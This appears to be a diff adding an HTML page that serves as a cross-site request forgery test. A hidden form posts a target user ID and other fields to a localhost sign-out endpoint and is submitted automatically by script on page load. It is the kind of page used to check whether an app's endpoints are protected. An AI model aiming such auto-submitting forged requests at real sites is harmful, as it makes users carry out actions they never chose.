@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <form action="http://localhost:3000/api/auth/sign-out/" method="POST">
+      <input type="hidden" name="date" value="2020-02-16" />
+      <input type="hidden" name="target_user_id" value="1440333593" />
+      <input type="hidden" name="response" value="ハマチくん" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
